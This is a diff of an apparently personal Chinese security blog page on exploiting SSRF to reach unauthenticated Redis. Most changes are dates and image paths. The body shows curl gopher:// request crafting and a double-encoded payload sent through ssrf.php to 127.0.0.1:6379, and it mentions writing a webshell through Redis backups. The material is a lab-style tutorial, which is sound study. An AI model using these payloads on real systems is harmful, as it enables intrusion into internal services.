@@ -16,27 +16,20 @@
   <meta name="author" content="qiaqia">
   <meta name="keywords" content="网络空间安全 web渗透">
   
-    <meta name="description" content="curl –version 查看本服务器的curl支持什么协议  1234567891011121314对于gopher协议发送get请求的前提换行必须要加上%0d%0a结尾必须要加上%0d%0a示例 :GET &#x2F;test.php?url&#x3D;tom  HTTP&#x2F;1.1HOST:192.168.111.113编码后 :GET %20&#x2F;test.php%3furl&#x3D;tom20%HTTP&#x2F;1.1%0d%">
+    <meta name="description" content="curl –version 查看本服务器的curl支持什么协议   1234567891011121314对于gopher协议发送get请求的前提换行必须要加上%0d%0a结尾必须要加上%0d%0a示例 :GET &#x2F;test.php?url&#x3D;tom  HTTP&#x2F;1.1HOST:192.168.111.113编码后 :GET %20&#x2F;test.php%3furl&#x3D;tom20%HTTP&#x2F;1.1%0d">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssrf配合redis未授授权">
-<meta property="og:url" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/index.html">
+<meta property="og:url" content="https://www.dongw.cf/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/index.html">
 <meta property="og:site_name" content="qiaqia专属记录">
-<meta property="og:description" content="curl –version 查看本服务器的curl支持什么协议  1234567891011121314对于gopher协议发送get请求的前提换行必须要加上%0d%0a结尾必须要加上%0d%0a示例 :GET &#x2F;test.php?url&#x3D;tom  HTTP&#x2F;1.1HOST:192.168.111.113编码后 :GET %20&#x2F;test.php%3furl&#x3D;tom20%HTTP&#x2F;1.1%0d%">
+<meta property="og:description" content="curl –version 查看本服务器的curl支持什么协议   1234567891011121314对于gopher协议发送get请求的前提换行必须要加上%0d%0a结尾必须要加上%0d%0a示例 :GET &#x2F;test.php?url&#x3D;tom  HTTP&#x2F;1.1HOST:192.168.111.113编码后 :GET %20&#x2F;test.php%3furl&#x3D;tom20%HTTP&#x2F;1.1%0d">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213303128.png">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213345663.png">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213428825.png">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213512241.png">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke/95/source_posts/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213553152.png">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/Users/win10/AppData/Roaming/Typora/typora-user-images/image-20221026213618746.png">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke/95/source_posts/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213641185.png">
-<meta property="og:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke/95/source_posts/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213755943.png">
-<meta property="article:published_time" content="2022-10-26T13:29:55.000Z">
-<meta property="article:modified_time" content="2022-10-26T13:46:58.461Z">
+<meta property="og:image" content="https://www.dongw.cf/img/a.jpg">
+<meta property="article:published_time" content="2021-07-26T13:29:55.000Z">
+<meta property="article:modified_time" content="2022-10-26T14:04:59.615Z">
 <meta property="article:author" content="qiaqia">
-<meta property="article:tag" content="网络空间安全 web渗透">
+<meta property="article:tag" content="ssrf配合redis未授授权">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://www.dongw.cf/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213303128.png">
+<meta name="twitter:image" content="https://www.dongw.cf/img/a.jpg">
   
   
   
@@ -231,8 +224,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-26 21:29" pubdate>
-          2022年10月26日 晚上
+        <time datetime="2021-07-26 21:29" pubdate>
+          2021年7月26日 晚上
         </time>
       </span>
     
@@ -297,22 +290,23 @@
             
               <div class="markdown-body">
                 
-                <p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213303128.png" srcset="/img/loading.gif" lazyload></p>
+                <p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213303128.png" srcset="/img/loading.gif" lazyload></p>
 <p>curl –version 查看本服务器的curl支持什么协议</p>
-<p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213345663.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213345663.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke\95\source_posts\ssrf配合redis未授授权\image-20221026215834394.png" srcset="/img/loading.gif" lazyload alt="image-20221026215834394"></p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">对于gopher协议发送get请求的前提<br>换行必须要加上<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br>结尾必须要加上<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br><br>示例 :<br>GET /test.php?url<span class="hljs-operator">=</span>tom  HTTP/<span class="hljs-number">1.1</span><br>HOST:<span class="hljs-number">192.168</span>.<span class="hljs-number">111.113</span><br><br>编码后 :<br>GET <span class="hljs-variable">%20</span>/test.php<span class="hljs-variable">%3</span>furl<span class="hljs-operator">=</span>tom<span class="hljs-number">20</span><span class="hljs-variable">%HTTP</span>/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br>HOST:<span class="hljs-variable">%20192</span>.<span class="hljs-number">168.111</span>.<span class="hljs-number">113</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br><br><br>需要利用 curl里面gopher协议发送GET请求       : curl  gopher://<span class="hljs-number">192.168</span>.<span class="hljs-number">111.133</span>:<span class="hljs-number">80</span>/_GET<span class="hljs-variable">%20</span>/test.php<span class="hljs-variable">%3</span>furl<span class="hljs-operator">=</span>tom<span class="hljs-variable">%20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>aHOST:<span class="hljs-variable">%20192</span>.<span class="hljs-number">168.111</span>.<span class="hljs-number">133</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213428825.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213428825.png" srcset="/img/loading.gif" lazyload></p>
 <p>gopher协议发送post请求包</p>
-<p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213512241.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213512241.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> gopher://<span class="hljs-number">192.168.159.130:80</span>/_POST%<span class="hljs-number">20</span>/test.php%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHost:%<span class="hljs-number">20192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">159</span>.<span class="hljs-number">130</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Type:%<span class="hljs-number">20</span>application/x-www-form-urlencoded%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Length:%<span class="hljs-number">208</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aurl=toms%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>
 
 <p>对于centos7利用gopher协议探测攻击内网kali的redis数据库:</p>
-<p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke\95\source_posts\ssrf配合redis未授授权\image-20221026213553152.png" srcset="/img/loading.gif" lazyload alt="image-20221026213553152"></p>
-<p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/Users\win10\AppData\Roaming\Typora\typora-user-images\image-20221026213618746.png" srcset="/img/loading.gif" lazyload alt="image-20221026213618746"></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213553152.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213618746.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xquery">*<span class="hljs-number">2</span><br><span class="hljs-variable">$3</span><br>get<br><span class="hljs-variable">$2</span><br>hs<br>quit //成功的前提之一<br><br><br><br>curl http://<span class="hljs-number">192.168</span>.<span class="hljs-number">127.11</span>/ssrf.php?url=gopher<span class="hljs-meta">%3a</span><span class="hljs-meta">%2f</span><span class="hljs-meta">%2f127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><span class="hljs-meta">%3a6379</span><span class="hljs-meta">%2f_</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%37</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%38</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><br><br><br>第一次编码 : <span class="hljs-meta">%2a</span><span class="hljs-meta">%32</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%24</span><span class="hljs-meta">%33</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%67</span><span class="hljs-meta">%65</span><span class="hljs-meta">%74</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%24</span><span class="hljs-meta">%32</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%68</span><span class="hljs-meta">%73</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%69</span><span class="hljs-meta">%74</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><br><br><br><br>第二次编码 : <span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%37</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%38</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke\95\source_posts\ssrf配合redis未授授权\image-20221026213641185.png" srcset="/img/loading.gif" lazyload alt="image-20221026213641185"></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213641185.png" srcset="/img/loading.gif" lazyload></p>
 <p><strong>一般redis处于内网,它不会设置安全密码,可以通过web服务器对redis进行ssrf进行攻击</strong></p>
 <p>我们对redis数据库写key的值的时候并没有限制写入的内容,于是我们可以写木马,但是我们木马放在哪里?redis数据备份与恢复起到了一定的作用.</p>
 <p>只要是curl或者浏览器访问都需要二次编码,因为gopher的原因</p>
@@ -322,7 +316,7 @@
 
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**只要是限制本地访问的redis需要用127.0.0.1来访问**</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/10/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke\95\source_posts\ssrf配合redis未授授权\image-20221026213755943.png" srcset="/img/loading.gif" lazyload alt="image-20221026213755943"></p>
+<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213755943.png" srcset="/img/loading.gif" lazyload></p>
 <p>儅ssrf用不了可以考慮用dict協議（不過1遇到設置密碼的服務就不得行了）</p>
 
                 
@@ -332,6 +326,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%A4%96%E7%BD%91%E7%9F%A5%E8%AF%86/" class="category-chain-item">外网知识</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/">#ssrf配合redis未授授权</a>
+      
+    </div>
   
 </div>
 
@@ -342,7 +364,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>ssrf配合redis未授授权</div>
-      <div>https://www.dongw.cf/2022/10/26/ssrf配合redis未授授权/</div>
+      <div>https://www.dongw.cf/2021/07/26/ssrf配合redis未授授权/</div>
     </div>
     <div class="license-meta">
       
@@ -354,7 +376,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年10月26日</div>
+          <div>2021年7月26日</div>
         </div>
       
       
@@ -398,11 +420,17 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2021/08/23/msf/" title="use msf">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">use msf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/26/ssrf/" title="ssrf">
+                      <a href="/2021/07/25/ssrf/" title="ssrf">
                         <span class="hidden-mobile">ssrf</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
